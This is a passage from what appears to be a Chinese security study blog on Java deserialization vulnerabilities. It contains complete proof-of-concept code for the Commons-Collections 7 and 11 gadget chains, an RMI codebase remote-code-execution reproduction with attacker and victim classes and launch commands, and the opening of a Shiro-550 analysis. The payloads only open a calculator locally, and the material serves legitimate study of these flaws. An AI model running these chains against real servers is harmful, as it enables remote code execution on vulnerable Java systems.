<h4 id="FakeTransformer引发的LazyMap问题"><a href="#FakeTransformer引发的LazyMap问题" class="headerlink" title="FakeTransformer引发的LazyMap问题"></a>FakeTransformer引发的LazyMap问题</h4><p>在<code>LazyMap.get()</code>中，<code>factory</code>为我们传入的空的<code>Transformer</code>，key值为<code>yy</code>，同时key值被放入<code>hashtable</code>.</p>
<pre><code class="java">public Object get(Object key) &#123;
    if (!super.map.containsKey(key)) &#123;
        Object value = this.factory.transform(key);//这里key值为yy
        super.map.put(key, value);//yy被放进hashtable
        return value;
    &#125; else &#123;
        return super.map.get(key);
    &#125;
&#125;
</code></pre>
<p>如下图：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210624980.png" alt="image-20211206210624980"></p>
<p>我们在<code>AbstractMap.equals()</code>方法中有一个if判断，此处的**size()**为1，<code>m.size()</code>为2 -》 因为<code>yy</code>被加进了<code>hashtable</code>，所以会直接返回false，从而不会触发利用链。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210904041.png" alt="image-20211206210904041"></p>
<p>因此我们需要把<code>yy</code>从<code>lazyMap</code>中移除。</p>
<pre><code class="java">lazyMap2.remove(&quot;yy&quot;);
</code></pre>
<h3 id="POC构造-2"><a href="#POC构造-2" class="headerlink" title="POC构造"></a>POC构造</h3><pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, IOException &#123;
        //lazymap.get()-&gt;factory[constructor].transform()
        /*
         * 客户端构造payload，并序列化文件
         * */

        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);//这里我们传入假的transformer，实际为空

        Map innerMap = new HashMap();
        innerMap.put(&quot;yy&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap

        Map innerMap2 = new HashMap();
        innerMap2.put(&quot;zZ&quot;,&quot;2&quot;);
        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);//return a new lazyMap


        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
        hashtable.put(lazyMap2,2);

        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
        field.setAccessible(true);
        field.set(chainedTransformer,transformers);
        lazyMap2.remove(&quot;yy&quot;);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashtable);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞


    &#125;
&#125;
</code></pre>
<h3 id="Reference-5"><a href="#Reference-5" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#Poc-4">Commons-Collections 1-7 分析</a></p>
<h2 id="Commons-Collections-11"><a href="#Commons-Collections-11" class="headerlink" title="Commons Collections 11"></a>Commons Collections 11</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>学完cc1-7好久，研究shiro550的时候发现要用到cc11，因为一些原因cc6不能用。</p>
<p>因此在这里会对cc11进行详细讲解，同时也是对之前的cc链的复习。</p>
<p>cc11是cc1、cc2、cc5、cc6的结合，用到了InvokerTransformer、javassist字节码编写、TemplateImpl字节码执行、TiedMapEntry、HashMap等</p>
<h3 id="环境搭建-7"><a href="#环境搭建-7" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这次我是直接使用maven创建的项目，就不用自己来导包了</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

    &lt;groupId&gt;org.example&lt;/groupId&gt;
    &lt;artifactId&gt;CommonsCollections11&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;commons-collections&lt;/groupId&gt;
        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
        &lt;version&gt;3.1&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.javassist&lt;/groupId&gt;
        &lt;artifactId&gt;javassist&lt;/artifactId&gt;
        &lt;version&gt;3.19.0-GA&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;

&lt;/project&gt;
</code></pre>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="恶意class字节码编写"><a href="#恶意class字节码编写" class="headerlink" title="恶意class字节码编写"></a>恶意class字节码编写</h4><p>每个ctClass代表我们要修改的class，因此我们在classPool中创建一个名叫Evil的CtClass</p>
<p>通过静态代码块，插入执行代码</p>
<pre><code class="java">        ClassPool classPool = ClassPool.getDefault();
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//
        byte[] evilbytes = cc.toBytecode();//恶意字节码
</code></pre>
<h4 id="TemplatesImpl加载恶意class"><a href="#TemplatesImpl加载恶意class" class="headerlink" title="TemplatesImpl加载恶意class"></a>TemplatesImpl加载恶意class</h4><p>在TemplateImpl中查找<code>defineClass</code>关键字，因为我们知道ClassLoader就是通过方法**defineClass()**来加载字节码的。</p>
<p>通过以下图可知，我们可以传入一个<code>_tfactory</code>的值(new一个它Class的新对象就可以)和<code>_bytecodes</code>（恶意字节码），然后再让获取到的loader来call它的defineClass()，从而将我们的字节码加载进jvm</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151143793.png" alt="image-20220102151143793"></p>
<p>上面的流程是在defineTransletClasses()里的，接下来我们要找到什么地方调用了defineTransletClasses()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151651096.png" alt="image-20220102151651096"></p>
<p>发现**getTransletInstance()<strong>调用了</strong>defineTranslateClasses()**，同时如果我们要使用该方法，需要让<code>_name</code>不为空，<code>_class</code>为空</p>
<p><strong>newTransformer()<strong>调用了</strong>getTransletInstance()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152313976.png" alt="image-20220102152313976"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152422839.png" alt="image-20220102152422839"></p>
<p><strong>getOutputProperties()<strong>调用了</strong>newTransformer()</strong></p>
<p>因此TemplateImpl执行顺序如下</p>
<blockquote>
<p>getOutputProperties-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTranslateClasses()-&gt;defineClass()</p>
</blockquote>
<p>那么其实只要找到调用TemplatesImpl#getOutputProperties或者TemplatesImpl#newTransformer()的地方就可以连接上了。</p>
<p>我们先编写一些TemplatesImpl的部分</p>
<pre><code class="java">        /*配置TemplatesImpl - 加载恶意class到jvm*/
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]&#123;evilbytes&#125;);//这里传入的evilbytes需要在byte[][]中
        Field name = templates.getClass().getDeclaredField(&quot;_name&quot;);
        name.setAccessible(true);
        name.set(templates,&quot;LeiHello&quot;);
        Field tfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        //任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发
</code></pre>
<h4 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>已知TemplatesImpl#getOutputProperties或者TemplatesImpl#newTransformer()任意一个方法被调用都可以触发。这里我们以<code>newTrasnformer()</code>为例</p>
<p>看一下调用的情况:</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102154928181.png" alt="image-20220102154928181"></p>
<p>在之前的cc3中已经分析过了<code>TrAXFilter()</code>的调用，在cc11里我们不再使用该链。</p>
<p>还记得InvokerTransformer吗，它是在commons-collections 3.1版本中存在的最为经常被使用的一个类。我们可以使用该类call任意方法。</p>
<p>再来回顾一下<strong>InvokerTransformer#transform</strong>方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102155548083.png" alt="image-20220102155548083"></p>
<p>因此我们可以这样写</p>
<pre><code class="java">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,null,null);
</code></pre>
<p>在之前对cc链的分析中，后续的利用导致在生成payload阶段就触发了执行，因此我们在这里应该先随意写一个method作为占位，之后再进行修改</p>
<pre><code class="java">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;getClass&quot;,null,null);
</code></pre>
<p>接下来寻找调用invokerTransformer#transform的方法，同时能够传入input=<code>templates</code>(我们的恶意class)</p>
<h4 id="LazyMap-2"><a href="#LazyMap-2" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>这里不再像之前的cc链一样使用ChainedTransformer，相反我们使用LazyMap来继续完成这个链。LazyMap有一个get()方法：</p>
<pre><code class="java">    public Object get(Object key) &#123;
        if (!super.map.containsKey(key)) &#123;
            Object value = this.factory.transform(key);//这里执行了transform方法
            super.map.put(key, value);
            return value;
        &#125; else &#123;
            return super.map.get(key);
        &#125;
    &#125;
</code></pre>
<p>如果this.factory为invokerTransformer，则当LazyMap#get被调用的时候，命令可以执行。</p>
<p>所以需要构造LazyMap</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102162535035.png" alt="image-20220102162535035"></p>
<p>可以直接通过decorate方法来构造：</p>
<pre><code class="java">        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, invokerTransformer);
</code></pre>
<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>现在需要找到一个Class能够调用LazyMap#get()方法，我们找到了<strong>TiedMapEntry</strong></p>
<p>在TiedMapEntry#get()处调用了getValue()方法</p>
<pre><code class="java">    public Object getValue() &#123;
        return this.map.get(this.key);
    &#125;
</code></pre>
<p>同时hashCode方法调用了getValue()方法</p>
<pre><code class="java">    public int hashCode() &#123;
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    &#125;
</code></pre>
<p><strong>这样写：</strong></p>
<pre><code class="java">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,templates);
</code></pre>
<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>为了调用TiedMapEntry#hashCode方法，可以利用HashMap的反序列化操作。</p>
<p>在HashMap中，它有自己的<strong>readObject()方法</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102165724308.png" alt="image-20220102165724308"></p>
<p>首先会反序列化HashMap中的key和value</p>
<p>在最后一行，调用了hash(key)</p>
<pre><code class="java">    static final int hash(Object key) &#123;
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
    &#125;
</code></pre>
<p>hash方法中调用了key.hashCode()</p>
<p>因此，如果我们将之前的tiedMapEntry放入hashMap的key中，就能触发整个利用链了。</p>
<pre><code class="java">        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,&quot;helloWorld&quot;);
</code></pre>
<h4 id="改写InvokerTransformer"><a href="#改写InvokerTransformer" class="headerlink" title="改写InvokerTransformer"></a>改写InvokerTransformer</h4><p>记得前面我们只是添加了在InvokerTransformer中添加了占位符号，下面需要改一下:</p>
<pre><code class="java">        lazyMap.clear();//需要把lazyMap中我们之前加入的没用的map给移除
        Field iMethodName = invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
        iMethodName.setAccessible(true);
        iMethodName.set(invokerTransformer,&quot;newTransformer&quot;);
</code></pre>
<h3 id="POC构造-3"><a href="#POC构造-3" class="headerlink" title="POC构造"></a>POC构造</h3><pre><code class="java">public class cc11 &#123;
    public static void main(String[] args) throws NoSuchFieldException, CannotCompileException, NotFoundException, IOException, IllegalAccessException, ClassNotFoundException &#123;
        /*构造恶意字节码*/
        ClassPool classPool = ClassPool.getDefault();
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//
        byte[] evilbytes = cc.toBytecode();//恶意字节码

        /*配置TemplatesImpl - 加载恶意class到jvm*/
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]&#123;evilbytes&#125;);//这里传入的evilbytes需要在byte[][]中
        Field name = templates.getClass().getDeclaredField(&quot;_name&quot;);
        name.setAccessible(true);
        name.set(templates,&quot;LeiHello&quot;);
        Field tfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        //任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发

        /*构造invokerTransformer来调用newTransformer()方法*/
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;getClass&quot;,null,null);

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, invokerTransformer);//需要把lazyMap中我们之前加入的没用的map给移除

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,templates);

        /*利用HashMap反序列化中的hash(key)方法，触发利用链*/
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,&quot;helloWorld&quot;);

        lazyMap.clear();
        Field iMethodName = invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
        iMethodName.setAccessible(true);
        iMethodName.set(invokerTransformer,&quot;newTransformer&quot;);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;1.ser&quot;));
        outputStream.writeObject(hashMap);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;1.ser&quot;));
        inputStream.readObject();
    &#125;
&#125;
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102172023830.png" alt="image-20220102172023830"></p>
<p>另一版本的POC我也放在仓库**<a target="_blank" rel="noopener" href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a>**上了（流程是一样的，不过是提取了一些方法，看起来更简洁一些）</p>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>终于学完了cc链，收获非常多，尤其是对java反射、代理和利用链的构造思路有了更深的理解。也非常感谢网上各位师傅无私的共享，才能让我看到这么精彩的分析。</p>
<h1 id="RMI反序列化漏洞"><a href="#RMI反序列化漏洞" class="headerlink" title="RMI反序列化漏洞"></a>RMI反序列化漏洞</h1><h2 id="RMI前置知识"><a href="#RMI前置知识" class="headerlink" title="RMI前置知识"></a>RMI前置知识</h2><p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a></p>
<h2 id="Codebase远程命令执行"><a href="#Codebase远程命令执行" class="headerlink" title="Codebase远程命令执行"></a>Codebase远程命令执行</h2><h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>在有些环境条件下，我们需要远程加载一些本地不存在的类，而<code>codebase</code>便是用来告诉JAVA应该从哪里远程加载本地不存在的类。</p>
<p>codebase可以是http, ftp这样的url地址，例如当我们加载<strong>example</strong>类时，Java发现本地并不存在这样的类，它就会去codebase指向的地址搜索下载<strong>example</strong>类并加载。</p>
<p>如果codebase是可控的，那么我们就可以让服务器恶意加载我们的攻击类（这个类在服务器上并不存在）。</p>
<p>Java官方自然注意到了这一点，于是采用了一些安全措施，让我们不能随意远程加载类，如果我们一定要加载远程类，需要满足以下条件：</p>
<ul>
<li>Server安装并配置了<strong>SecurityManager</strong></li>
<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code><ul>
<li>useCodebaseOnly参数在7u21、6u45版本之后默认设置为<strong>true</strong>，表示Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取</li>
</ul>
</li>
</ul>
<p>该漏洞利用条件苛刻，因此少有人对此进行深入研究，P神在<strong>JAVA安全漫谈</strong>中提到了该漏洞，我在复现的时候遇到了很多坑，网上的大部分资料细节都交代得不清不楚，很难弄懂，单单是这个漏洞就花了我很长时间去复现，此文将详细讲解原理，希望能够帮大家弄懂每一步。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="被攻击方"><a href="#被攻击方" class="headerlink" title="被攻击方"></a>被攻击方</h4><p><strong>RemoteRMIServer.java</strong></p>
<pre><code class="java">import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RemoteRMIServer &#123;
    private void start() throws Exception &#123;
        if (System.getSecurityManager() == null) &#123;//设置SecurityManager
            System.out.println(&quot;setup SecurityManager&quot;);
            System.setSecurityManager(new SecurityManager());
        &#125;
        Calc h = new Calc();
        LocateRegistry.createRegistry(1099);//创建registry
        Naming.rebind(&quot;refObj&quot;, h);//绑定service Calc
    &#125;
    public static void main(String[] args) throws Exception &#123;
        new RemoteRMIServer().start();
    &#125;
&#125;
</code></pre>
<p><strong>ICalc.java</strong></p>
<pre><code class="java">import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
public interface ICalc extends Remote &#123;//功能接口
    public Integer sum(List&lt;Integer&gt; params) throws RemoteException;
&#125;
</code></pre>
<p><strong>Calc.java</strong></p>
<pre><code class="java">import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
import java.rmi.server.UnicastRemoteObject;
public class Calc extends UnicastRemoteObject implements ICalc &#123;//实现功能
    public Calc() throws RemoteException &#123;&#125;
    public Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;
        Integer sum = 0;
        for (Integer param : params) &#123;
            sum += param;
        &#125;
        return sum;
    &#125;
&#125;
</code></pre>
<h4 id="攻击方"><a href="#攻击方" class="headerlink" title="攻击方"></a>攻击方</h4><p><strong>RMIClient</strong></p>
<pre><code class="java">import java.rmi.Naming;
import java.util.List;
import java.util.ArrayList;
import java.io.Serializable;
public class RMIClient implements Serializable &#123;

    private static final long serialVersionUID = 1L;

    /* static 方法里是我们的恶意执行代码 */
    static &#123;
        try&#123;
            Runtime.getRuntime().exec(&quot;calc&quot;);
        &#125; catch (Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;
    public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;
    public void lookup() throws Exception &#123;
        if (System.getSecurityManager() == null) &#123;//同样需要安装SecurityManager
            System.out.println(&quot;setup SecurityManager&quot;);
            System.setSecurityManager(new SecurityManager());
        &#125;
        ICalc r = (ICalc)
                Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);//查找Registry上的refObj service
        List&lt;Integer&gt; li = new Payload();
        li.add(3);
        li.add(4);
        System.out.println(r.sum(li));//这里调用了远程方法的sum(),并传入了li对象
    &#125;
    public static void main(String[] args) throws Exception &#123;
        new RMIClient().lookup();
    &#125;
&#125;
</code></pre>
<p><strong>为什么RMIClient这样写就能触发漏洞呢？</strong></p>
<p>实际上，我们在<a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a>就有提到过，远程方法的调用是在server进行的，而并非<strong>本地client端</strong>，同时，远程调用的方法参数是经过序列化的。</p>
<p>拿这个例子来说，我们首先用<code>ICalc r = (ICalc) Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);</code>找到了<strong>Registry</strong>上的<strong>refobj</strong>方法，又调用了其<strong>sum</strong>方法。关键点在于，我们在调用其<strong>sum</strong>方法的时候传入了我们在本地构造的 <code>Payload</code> 类型的对象 <code>li</code>，<code>li</code>被序列化，随<code>sum()</code>传入<strong>server进行调用</strong>，接着server端会对它进行<strong>反序列化</strong>。在反序列化的过程中，<strong>RemoteRMIServer.java</strong>发现这个Payload类它并不认识，因为在server端并没有该类。于是它就去<strong>codebase</strong>指向的地址上找Payload类，找到后将该类的定义下载下来，然后才能反序列化<code>li</code>对象。</p>
<p>而我们的Payload类的static方法中有恶意代码(此处我们是将payload类和RMIClient写在一起了)，所以当server加载后，会执行该恶意代码。</p>
<h4 id="Policy配置"><a href="#Policy配置" class="headerlink" title="Policy配置"></a>Policy配置</h4><p>Server端和Client端都需要新建一个文件来控制RMI的访问权限，这里我们命名为<strong>client.policy</strong></p>
<pre><code class="tex">grant &#123;
    permission java.security.AllPermission;
&#125;;
</code></pre>
<h4 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h4><p>我们在IDEA中选择build project，让它生成class文件。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212231734543.png" alt="image-20211212231734543"></p>
<p>此时out目录下会生成我们所有的class文件</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212234937446.png" alt="image-20211212234937446"></p>
<p>在真实环境中，<strong>RMIClient</strong>是在攻击者的电脑上运行的，所以我把<strong>RMIClient</strong>移动到<strong>其他目录</strong>下来模拟这个环境。</p>
<p>如果你进入out/production/RM_ITEST生成目录（不在IDEA中）下看的话，你会发现还有一个class文件 - <strong>RMIClient$Payload.class</strong>，这是我们在RMIClient内部生成的class文件，也就是Server会去找的Payload类，我们也不能让它与<strong>RemoteRMIServer.class</strong>在一个目录，不然Server端是能在本地找到Payload类的，从而不能触发漏洞。同样将它移动到其他目录去，这里我把它和<strong>RMIClient.class、ICalc</strong>放一起。</p>
<p>这里可能会有疑问为什么要将<strong>ICalc</strong>也放在这，因为我们在Client的代码中将stub转换成了ICalc类，所以也得放在一起。那能不能不转换呢？答案是不可以，经过测试，Stub必须被转化为相应的类，否则call其方法的时候不会有反应。注意这里也需要client.policy,因为我们在client也配置了SecurityManager</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001727380.png" alt="image-20211213001727380"></p>
<p>一切准备就绪，先运行Server端</p>
<p>这里我选择用<strong>terminal</strong>来执行，你也可以使用IDEA的配置来执行</p>
<p><code>java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</code></p>
<p>此处<strong>hostname</strong>为你RMI服务器的地址，<strong>security.policy</strong>是我们之前创建的policy文件的名字，<strong>RemoteRMIServer</strong>是我们要运行的Java class文件名字</p>
<p>你需要在生成的相关<strong>class</strong>文件目录下运行命令(之前一直在IDEA下面的terminal运行，运行实际是在java文件目录下，导致卡在这里很久)</p>
<p>接着你需要模仿攻击者，在你的恶意类(RMIClient$Payload.class)所在目录搭建一个<strong>http</strong>服务，供<strong>server</strong>端访问下载你的恶意类</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233501619.png" alt="image-20211212233501619"></p>
<p>此处我使用python，在本地搭建了一个8080端口的web服务</p>
<p>接着，可以用<strong>RMIClient</strong>实施攻击了</p>
<p><code>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:8080/ -Djava.security.policy=client.policy RMIClient</code></p>
<p>这里的codebase是你搭建的web服务地址，<strong>RMIClient</strong>为你运行的Class名字。</p>
<p>成功弹出计算器！<strong>计算器被弹出两次</strong>，第一次是因为Client创建Payload实例(在攻击者电脑上弹出)，第二次是远程执行(在被攻击服务端上弹出)。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233854484.png" alt="image-20211212233854484"></p>
<p>同时我们在python运行的web服务上也能看到class加载记录</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001956198.png" alt="image-20211213001956198"></p>
<h3 id="Reference-6"><a href="#Reference-6" class="headerlink" title="Reference"></a>Reference</h3><p>P神 - Java安全漫谈</p>
<h1 id="Shiro反序列化漏洞系列"><a href="#Shiro反序列化漏洞系列" class="headerlink" title="Shiro反序列化漏洞系列"></a>Shiro反序列化漏洞系列</h1><h2 id="Shiro550反序列化漏洞"><a href="#Shiro550反序列化漏洞" class="headerlink" title="Shiro550反序列化漏洞"></a>Shiro550反序列化漏洞</h2><h3 id="环境搭建-8"><a href="#环境搭建-8" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code class="bash">git clone https://github.com/apache/shiro.git  
cd shiro
git checkout shiro-root-1.2.4
</code></pre>
<p>在Intellij中将<strong>samples/web</strong>以项目的形式打开，在pom.xml中将jstl修改为1.2版本</p>
<pre><code class="xml">        &lt;dependency&gt;
            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
            &lt;artifactId&gt;jstl&lt;/artifactId&gt;
            &lt;version&gt;1.2&lt;/version&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
        &lt;/dependency&gt;
</code></pre>
<p>整个project将使用jdk1.8</p>
<p>Tomcat配置如下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223132310175.png" alt="image-20211223132310175"></p>
<p>运行即可。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223151852743.png" alt="image-20211223151852743"></p>
<h3 id="反序列化触发流程"><a href="#反序列化触发流程" class="headerlink" title="反序列化触发流程"></a>反序列化触发流程</h3><h4 id="入手点"><a href="#入手点" class="headerlink" title="入手点"></a>入手点</h4><p>问题主要出在登录处的<strong>Remember Me</strong>功能。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152235321.png" alt="image-20211223152235321"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152603584.png" alt="image-20211223152603584"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152643912.png" alt="image-20211223152643912"></p>
<p>我们发现登陆后的cookie中会有rememberMe的字段，同时后面跟了一长串的数据。</p>
<p>我们猜测rememberMe可能保存了我们的账号密码数据</p>
<p>为了验证我们的猜想，在Intellij中连续按两下shift，搜索RememberMe</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223153240686.png" alt="image-20211223153240686"></p>
<p>这里找到了相关的Class，我们进入AbstractRememberMeManager看一下</p>
<p>看名字，我们就能猜出是和Remember Me这个功能有关</p>
<p>看一下它的constructor</p>
<pre><code class="java">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);

public AbstractRememberMeManager() &#123;
    this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);//此处设置了cipher key
&#125;

public void setCipherKey(byte[] cipherKey) &#123;
